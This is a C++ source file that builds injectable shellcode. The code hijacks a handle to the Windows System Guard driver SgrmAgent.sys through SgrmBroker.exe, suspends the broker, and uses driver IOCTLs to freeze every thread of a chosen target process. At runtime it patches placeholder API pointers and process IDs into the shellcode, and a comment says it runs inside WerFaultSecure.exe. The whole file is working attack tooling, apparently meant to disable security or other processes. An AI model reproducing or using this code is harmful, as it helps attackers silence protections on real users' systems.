// SgrmInjectionLib.cpp : Defines the functions for the static library.
//

#include "pch.h"
#include "framework.h"
#include <SgrmInjectionLib/SgrmInjectionLib.h>


static PVOID g_pShellcode = nullptr;
static DWORD g_dwShellcode = 0;


#pragma optimize ("", off)
static
BOOL
WINAPI
ShellCode_ProcessFreezing_start()
{
    BOOL status = FALSE;
    BOOL isBrokerSuspended = FALSE;
    DWORD dwSgrmBrokerId = 0x12121212;
    DWORD dwTargetProcessId = 0x15151515;
    HANDLE hSgrmBroker = 0;
    HANDLE hSgrmAgent = 0;

    PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = nullptr;
    POBJECT_NAME_INFORMATION pObjectNameInformation = nullptr;
    ULONG szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION);
    ULONG ulReturnLength = 0;
    ULONG iterator = 0, iterator2 = 0;

    /* "\Device\MSSGRMAGENTSYS" */
    // 0x0044005c 
    // 0x00760065 
    // 0x00630069 
    // 0x005c0065 
    // 0x0053004D
    // 0x00470053
    // 0x004d0052 
    // 0x00470041 
    // 0x004e0045 
    // 0x00530054 
    // 0x00530059
    DWORD ObjectName[] = {
        0x0044005c, 0x00760065, 0x00630069,
        0x005c0065, 0x0053004D, 0x00470053,
        0x004d0052, 0x00470041, 0x004e0045,
        0x00530054, 0x00530059, 0x00000000 };

    /* Output buffer for all device operations */
    PVOID pOutBuffer = nullptr;

    /* Process reference structs */
    SGRM_HANDLE_REF_PROCESS_OBJ InputBufferProc{};
    PSGRM_HANDLE_REF_PROCESS_OBJ_OUTPUT pOutputBufferProc = nullptr;
    PVOID process = nullptr;

    /* Thread reference structs */
    SGRM_HANDLE_NEXT_REF_THREAD_INPUT InputBufferNextThread{};
    PSGRM_HANDLE_NEXT_REF_THREAD_OUTPUT pOutputBufferNextThread = nullptr;
    PVOID thread = nullptr;

    /* Thread freezing structs */
    SGRM_HANDLE_THREAD_INPUT InputBufferThread{};
    PSGRM_HANDLE_THREAD_OUTPUT pOutputBufferThread = nullptr;


    hSgrmBroker = ((POPENPROCESS)0x4141414141414141)(PROCESS_ALL_ACCESS, FALSE, dwSgrmBrokerId);
    if (hSgrmBroker == INVALID_HANDLE_VALUE || !hSgrmBroker) {
        goto Exit;
    }

    while ((((PNTQUERYSYSTEMINFORMATION)0x5151515151515151)(
        0x10,
        (PVOID)pSystemHandleInformation,
        szSystemInformationBuffer,
        NULL))) {

        if (pSystemHandleInformation) {
            ((PLOCALFREE)0x4343434343434343)(pSystemHandleInformation);
            szSystemInformationBuffer *= 2;
        }
        pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)((PLOCALALLOC)0x4242424242424242)(LPTR, szSystemInformationBuffer);
        if (!pSystemHandleInformation) {
            break;
        }
    }

    if (!pSystemHandleInformation) {
        goto Exit;
    }

    pObjectNameInformation = (POBJECT_NAME_INFORMATION)((PLOCALALLOC)0x4242424242424242)(LPTR, MAX_PATH * sizeof(WCHAR));
    if (!pObjectNameInformation) {
        goto Exit;
    }

    for (iterator = 0; iterator < pSystemHandleInformation->HandleCount; iterator++) {
        if (pSystemHandleInformation->Handles[iterator].ProcessId == dwSgrmBrokerId) {

            ((PDUPLICATEHANDLE)0x4444444444444444)(
                hSgrmBroker,
                (void*)((UINT_PTR)pSystemHandleInformation->Handles[iterator].Handle),
                (HANDLE)-1,
                &hSgrmAgent,
                0,
                FALSE,
                DUPLICATE_SAME_ACCESS);

            if (hSgrmAgent > (PVOID)0) {

                ((PNTQUERYOBJECT)0x5252525252525252)(
                    hSgrmAgent,
                    1,
                    pObjectNameInformation,
                    MAX_PATH * sizeof(WCHAR),
                    &ulReturnLength);

                if (pObjectNameInformation->Name.Buffer) {
                    if (!((PWCSCMP)0x5555555555555555)(pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName)) {
                        break;
                    }
                    else {
                        for (iterator2 = 0; iterator2 < MAX_PATH + sizeof(WCHAR); iterator2++) {
                            *(PBYTE)((PBYTE)pObjectNameInformation + iterator2) = 0x00;
                        }
                    }
                }

                ((PCLOSEHANDLE)0x4646464646464646)(hSgrmAgent);
                hSgrmAgent = 0;
            }
        }
    }

    if (!hSgrmAgent) {
        goto Exit;
    }

    // Suspending SgrmBroker.exe ...
    if (((PNTSUSPENDPROCESS)0x5353535353535353)(hSgrmBroker)) {
        goto Exit;
    }
    else {
        isBrokerSuspended = TRUE;
    }

    // Preparing the output buffer for all device operations
    pOutBuffer = (PVOID)((PLOCALALLOC)0x4242424242424242)(LPTR, 0x1000);
    if (!pOutBuffer) {
        goto Exit;
    }

    // Referencing the target process
    InputBufferProc.Header.Operation = HandleGetReferencedProcessObject;
    InputBufferProc.Header.SizeOfInput = 0xC;
    InputBufferProc.ProcessId = dwTargetProcessId;
    pOutputBufferProc = (PSGRM_HANDLE_REF_PROCESS_OBJ_OUTPUT)pOutBuffer;
    status = ((PDEVICEIOCONTROL)0x4545454545454545)(
        hSgrmAgent,
        SGRM_MAILBOX,
        &InputBufferProc,
        sizeof(InputBufferProc),
        pOutBuffer,
        0x1000,
        nullptr,
        nullptr);
    if (!status ||
        pOutputBufferProc->Header.StatusCode) {
        goto Exit;
    }

    process = pOutputBufferProc->process;

    // Clean up output buffer
    pOutputBufferProc = nullptr;
    for (iterator2 = 0; iterator2 < 0x1000; iterator2++) {
        *(PBYTE)((PBYTE)pOutBuffer + iterator2) = 0x00;
    }

    // referencing and freezing threads ...
    InputBufferThread.Header.Operation = HandleFreezeThread;
    InputBufferThread.Header.SizeOfInput = 0x8;
    InputBufferNextThread.Header.Operation = HandleNextReferencedThread;
    InputBufferNextThread.Header.SizeOfInput = 0xc;
    InputBufferNextThread.process = process;
    pOutputBufferNextThread = (PSGRM_HANDLE_NEXT_REF_THREAD_OUTPUT)pOutBuffer;

    while (1) {
        InputBufferNextThread.thread = thread;
        status = ((PDEVICEIOCONTROL)0x4545454545454545)(
            hSgrmAgent,
            SGRM_MAILBOX,
            &InputBufferNextThread,
            sizeof(InputBufferNextThread),
            pOutBuffer,
            0x1000,
            nullptr,
            nullptr);

        if (pOutputBufferNextThread->NextThread) {

            thread = pOutputBufferNextThread->NextThread;
            InputBufferThread.pethread = thread;

            status = ((PDEVICEIOCONTROL)0x4545454545454545)(
                hSgrmAgent,
                SGRM_MAILBOX,
                &InputBufferThread,
                sizeof(InputBufferThread),
                pOutBuffer,
                0x1000,
                nullptr,
                nullptr);
        }
        else {
            break;
        }
    }


    // Allowing 15 minutes before thawing SgrmBroker.exe and
    // sending a PurgeAll request to SgrmAgent.sys, meaning
    // the threads we have frozen will stay as such for a minute.
    // SgrmBroker.exe in Win10 doesn't automatically purge everything 
    // every second like in Win11. This is why we have to manually send a 
    // PurgeAll request before returning from this shellcode. 
    // See the Exit label.
    ((PSLEEP)0x1111111111111111)(60000);


Exit:
    // We're not doing any handle or allocation
    // cleanup in WerFaultSecure.exe. Once the process dies, 
    // the OS will do the cleanup for us. This shellcode is very long already.
    // The following DeviceIoControl call is to send a PurgeAll request
    // to SgrmAgent.sys for the reason specified in the previous comment.
    if (status && hSgrmAgent) {
        InputBufferThread.Header.Operation = HandlePurgeAll;
        InputBufferThread.Header.SizeOfInput = 0x8;
        InputBufferThread.pethread = nullptr;
        ((PDEVICEIOCONTROL)0x4545454545454545)(
            hSgrmAgent,
            SGRM_MAILBOX,
            &InputBufferThread,
            sizeof(InputBufferThread),
            pOutBuffer,
            0x1000,
            nullptr,
            nullptr);
    }
    if (isBrokerSuspended) {
        ((PNTRESUMEPROCESS)0x5454545454545454)(hSgrmBroker);
    }

    return status;
}
static
BOOL
WINAPI
ShellCode_ProcessFreezing_end() { return 0; }
#pragma optimize ("", on)


static
DWORD
GetProcessIdByName(_In_ const wchar_t* processName)
{
    DWORD result = 0;
    HANDLE hSnap = 0;
    PROCESSENTRY32 entry32{};

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        goto exit;
    }

    entry32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &entry32)) {
        while (Process32Next(hSnap, &entry32)) {
            if (!_wcsicmp(entry32.szExeFile, processName)) {
                result = entry32.th32ProcessID;
                break;
            }
        }
    }

exit:
    if (hSnap) {
        CloseHandle(hSnap);
    }

    return result;
}


static
BOOL
ReplaceFakePointers(
    _In_ LPVOID buffer,
    _In_ DWORD DataSize,
    _In_ PREPLACEABLE_POINTER pReplPointers,
    _In_ DWORD count,
    _In_ PREPLACEABLE_DWORD pReplDwords,
    _In_ DWORD ReplDwordsCount)
{
    BOOL status = TRUE;
    HMODULE hModule = 0;
    DWORD i = 0, j = 0;

    // Resolve pointers
    for (i = 0; i < count; i++) {
        if ((pReplPointers[i].RealPtr == NULL) &&
            (pReplPointers[i].Module != NULL) &&
            (pReplPointers[i].FakePtr != NULL) &&
            (pReplPointers[i].Name != NULL)) {

            hModule = GetModuleHandle(pReplPointers[i].Module);
            if (hModule == NULL) {
                hModule = LoadLibrary(pReplPointers[i].Module);
            }
            if (hModule != NULL) {
                pReplPointers[i].RealPtr = (PVOID)GetProcAddress(hModule, pReplPointers[i].Name);
            }
            else {
                status = FALSE;
                goto Exit;
            }

        }
    }

    // Resolve process Ids
    for (i = 0; i < ReplDwordsCount; i++) {
        if (!pReplDwords[i].RealDword) {
            pReplDwords[i].RealDword = GetProcessIdByName(pReplDwords[i].processName);
        }
    }

    // Check pointers
    for (i = 0; i < count; i++) {
        if (!pReplPointers[i].RealPtr) {
            status = FALSE;
            goto Exit;
        }
    }

    // Check process Ids
    for (i = 0; i < ReplDwordsCount; i++) {
        if (!pReplDwords[i].RealDword) {
            status = FALSE;
            goto Exit;
        }
    }

    // Replace fake pointers
    for (i = 0; i < count; i++) {
        for (j = 0; j < DataSize - sizeof(PVOID); j++) {
            if (*(LPVOID*)((PBYTE)buffer + j) == pReplPointers[i].FakePtr) {
                *(LPVOID*)((PBYTE)buffer + j) = pReplPointers[i].RealPtr;
                j += sizeof(PVOID) - 1;
            }
        }
    }

    // Replace fake process ids
    for (i = 0; i < ReplDwordsCount; i++) {
        for (j = 0; j < DataSize - sizeof(DWORD); j++) {
            if (*(DWORD*)((PBYTE)buffer + j) == pReplDwords[i].FakeDword) {
                *(DWORD*)((PBYTE)buffer + j) = pReplDwords[i].RealDword;
                j += sizeof(DWORD) - 1;
            }
        }
    }

Exit:
    return status;
}


void
FreeSgrmShellcode()
{
    if (g_pShellcode && g_dwShellcode > 0) {
        LocalFree(g_pShellcode);
        g_pShellcode = nullptr;
        g_dwShellcode = 0;
    }
}


bool
AllocateSgrmShellcode(
    _In_ const wchar_t* targetProcessName,
    _Inout_ void** pShellcode,
    _Inout_ unsigned long* dwShellcode)
{
    bool status = false;
    REPLACEABLE_POINTER ReplPointers[] = {
        { L"kernel32.dll", "OpenProcess", (PVOID)0x4141414141414141, NULL},
        { L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL },
        { L"kernel32.dll", "LocalFree", (PVOID)0x4343434343434343, NULL },
        { L"kernel32.dll", "DuplicateHandle", (PVOID)0x4444444444444444, NULL },
        { L"kernel32.dll", "Sleep", (PVOID)0x1111111111111111, NULL },
        { L"kernel32.dll", "DeviceIoControl", (PVOID)0x4545454545454545, NULL },
        { L"kernel32.dll", "CloseHandle", (PVOID)0x4646464646464646, NULL },
        { L"kernel32.dll", "ExitProcess", (PVOID)0x4747474747474747, NULL },

        { L"ntdll.dll", "NtQuerySystemInformation", (PVOID)0x5151515151515151, NULL },
        { L"ntdll.dll", "NtQueryObject", (PVOID)0x5252525252525252, NULL },
        { L"ntdll.dll", "NtSuspendProcess", (PVOID)0x5353535353535353, NULL },
        { L"ntdll.dll", "NtResumeProcess", (PVOID)0x5454545454545454, NULL },
        { L"ntdll.dll", "wcscmp", (PVOID)0x5555555555555555, NULL }
    };
    DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER);
    REPLACEABLE_DWORD ReplDwords[] = {
        { L"SgrmBroker.exe", 0x12121212, 0 },
        { targetProcessName, 0x15151515, 0 }
    };
    DWORD FakeDwordsCount = sizeof(ReplDwords) / sizeof(REPLACEABLE_DWORD);
    DWORD szShellcode = (DWORD)((PBYTE)ShellCode_ProcessFreezing_end - (PBYTE)ShellCode_ProcessFreezing_start);
    PVOID pLocalHandler = nullptr;
    g_dwShellcode = szShellcode;

    if (!pShellcode || !dwShellcode) {
        SetLastError(ERROR_INVALID_PARAMETER);
        goto Exit;
    }

    if (szShellcode < 0) {
        SetLastError(ERROR_GEN_FAILURE);
        goto Exit;
    }

    pLocalHandler = (PVOID)LocalAlloc(LPTR, szShellcode);
    if (!pLocalHandler) {
        goto Exit;
    }

    RtlCopyMemory(pLocalHandler, ShellCode_ProcessFreezing_start, szShellcode);
    g_pShellcode = pLocalHandler;

    status = ReplaceFakePointers(
        pLocalHandler,
        szShellcode,
        (PREPLACEABLE_POINTER)&ReplPointers,
        FakePtrsCount,
        (PREPLACEABLE_DWORD)&ReplDwords,
        FakeDwordsCount);

    if (status) {
        *pShellcode = pLocalHandler;
        *dwShellcode = g_dwShellcode;
    }
    else {
        FreeSgrmShellcode();
    }

Exit:
    return status;
}
